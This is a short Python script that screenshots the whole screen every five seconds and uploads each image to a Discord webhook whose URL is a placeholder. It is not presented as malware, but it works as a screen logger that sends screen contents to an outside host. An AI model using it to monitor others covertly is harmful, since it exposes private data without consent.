import pyautogui, time, discord, aiohttp, asyncio
from discord import Webhook

i = 1
url = "webhook here"

async def anything(url):
    async with aiohttp.ClientSession() as session:
        file = discord.File(r'screenshot-'+ str(i) +'.png', filename=r'screenshot-'+ str(i) +'.png')
        webhook = Webhook.from_url(url, session=session)
        embed = discord.Embed()
        embed.set_image(url="attachment://"+r'screenshot-'+ str(i) +'.png')
        await webhook.send(embed=embed, file=file)

while True:

    pyautogui.screenshot('screenshot-'+ str(i) +'.png')
    print('screenshot-'+ str(i) +'.png SAVED!.')
    
    loop = asyncio.new_event_loop()
    loop.run_until_complete(anything(url))
    loop.close()
   
    time.sleep(5)
    i = i + 1